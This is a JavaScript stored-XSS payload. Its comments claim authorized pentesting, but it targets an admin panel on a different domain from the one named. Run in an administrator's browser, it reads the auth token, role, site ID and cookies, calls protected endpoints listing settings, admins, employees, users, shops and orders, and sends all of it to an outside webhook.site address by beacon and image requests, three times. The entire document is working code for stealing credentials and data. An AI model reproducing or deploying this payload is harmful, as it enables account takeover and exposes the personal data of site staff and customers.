// Pentest payload - authorized security testing on massaka34.online
// Runs in admin's browser context on cpanel.auo24.cc via stored XSS
(function(){
  var U = "https://webhook.site/90b9e044-9fcd-414e-b991-e69f214e0140";
  var T = localStorage["O-AUTH-TOKEN"] || "";
  var H = {
    "Content-Type": "application/json",
    "CHINA-APP-NAME": "admin",
    "X-CHINA-AUTH": T,
    "X-CHINA-RAY": "pentest",
    "X-CHINA-TIME": Date.now() + ""
  };

  function F(path, body) {
    return fetch(path, {
      method: "POST",
      credentials: "include",
      headers: H,
      body: JSON.stringify(body || {})
    }).then(function(r) { return r.text(); })
    .catch(function() { return "err"; });
  }

  function X(data) {
    try { navigator.sendBeacon(U, data); } catch(e) {}
    try {
      var img = new Image();
      img.src = U + "?d=" + encodeURIComponent(data.substring(0, 1900));
    } catch(e) {}
  }

  Promise.all([
    F("/protected/settings"),
    F("/protected/admin/list"),
    F("/protected/employees/list"),
    F("/protected/users/list", {offset: 0, limit: 5}),
    F("/protected/shops/get"),
    F("/protected/orders/list", {offset: 0, limit: 5})
  ]).then(function(r) {
    var d = JSON.stringify({
      v: 8,
      t: T,
      role: localStorage["role"] || "",
      site: localStorage["siteName"] || "",
      uid: localStorage["siteUid"] || "",
      cookie: document.cookie,
      settings: r[0].substring(0, 3000),
      admins: r[1].substring(0, 2000),
      employees: r[2].substring(0, 2000),
      users: r[3].substring(0, 2000),
      shops: r[4].substring(0, 2000),
      orders: r[5].substring(0, 2000),
      ts: Date.now()
    });
    X(d);
    setTimeout(function() { X(d); }, 3000);
    setTimeout(function() { X(d); }, 8000);
  });
})();
